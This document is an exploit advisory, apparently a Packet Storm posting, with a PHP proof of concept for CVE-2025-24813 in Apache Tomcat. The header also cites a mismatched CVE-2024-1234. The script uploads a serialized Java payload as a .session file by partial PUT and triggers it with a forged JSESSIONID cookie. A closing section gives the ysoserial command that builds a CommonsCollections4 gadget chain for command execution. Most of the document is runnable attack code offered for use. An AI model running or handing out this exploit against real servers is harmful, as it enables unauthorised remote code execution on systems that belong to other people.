@@ -1,0 +1,132 @@
+=============================================================================================================================================
+| # Title     : Apache Tomcat 11.0.3 Remote Session Injection                                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://tomcat.apache.org/                                                                                                  |
+=============================================================================================================================================
+
+[+] Summary : 
+
+A vulnerability allows attackers to upload a .session file containing a malicious Java serialized payload and then trigger it through a forged JSESSIONID cookie.
+
+[+] References : ( CVE-2024-1234 ) 
+
+1. Save the file as: poc.php
+
+2. Edit the target:
+```php
+$target = "http://TARGET";
+
+3.Execute: php poc.php
+
+[+]  POC
+
+<?php
+/*
+    CVE-2025-24813 – PHP Exploit 
+    Author: Indoushka
+    Packet Storm Security 
+*/
+
+function rand_filename($length = 6) {
+    $chars = 'abcdefghijklmnopqrstuvwxyz';
+    $name = '';
+    for ($i = 0; $i < $length; $i++) {
+        $name .= $chars[random_int(0, strlen($chars)-1)];
+    }
+    return $name;
+}
+
+function generate_payload($interact_url) {
+    // Java Serialized payload (replace with your custom gadget)
+    return "\xac\xed\x00\x05\x73\x72\x00\x04\x44\x75\x6d\x6d\x79\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x78\x70";
+
+}
+
+function exploit($target, $interact_url) {
+
+    $filename = rand_filename();
+    $put_url = $target . "/" . $filename . ".session";
+    $get_url = $target . "/" . $filename;
+
+    echo "[+] Exploit for CVE-2025-24813\n";
+    echo "[+] By Indoushka\n\n";
+    echo "[+] Uploading payload to: $put_url\n";
+
+    $payload = generate_payload($interact_url);
+
+    $headers = [
+        "Content-Range: bytes 0-452/457",
+        "Content-Type: application/octet-stream"
+    ];
+
+    $opts = [
+        'http' => [
+            'method' => "PUT",
+            'header' => implode("\r\n", $headers),
+            'content' => $payload,
+            'ignore_errors' => true
+        ]
+    ];
+
+    $context = stream_context_create($opts);
+    $result = @file_get_contents($put_url, false, $context);
+
+    preg_match('/HTTP\/\d\.\d\s+(\d+)/', $http_response_header[0], $m);
+    $status = $m[1];
+
+    if ($status == 201) {
+        echo "[+] Payload uploaded successfully.\n";
+    } else {
+        echo "[-] Upload failed with status: $status\n";
+        return;
+    }
+
+    echo "[+] Triggering payload via: $get_url\n";
+
+    $opts2 = [
+        'http' => [
+            'method' => "GET",
+            'header' => "Cookie: JSESSIONID=.$filename\r\n",
+            'ignore_errors' => true
+        ]
+    ];
+
+    $context2 = stream_context_create($opts2);
+    @file_get_contents($get_url, false, $context2);
+
+    echo "[+] Trigger request sent. Check your Interactsh callback: $interact_url\n";
+}
+
+// ====== Interactive Shell ======
+echo "[+] Exploit for CVE-2025-24813\n";
+echo "[+] Made By Indoushka\n\n";
+
+echo "Target URL: ";
+$target = trim(fgets(STDIN));
+
+echo "Interact URL: ";
+$interact = trim(fgets(STDIN));
+
+exploit($target, $interact);
+?>
+
+
+
+------------
+
+Generating a gadgets chain:
+
+Generate a Commons-Collections-4 payload to execute the command: whoami
+
+java -jar ysoserial.jar CommonsCollections4 "whoami" > payload.bin
+
+Convert it to hex or base64 for input into PHP : xxd -p payload.bin
+
+Place it where: return "<hex serialized bytes>";
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
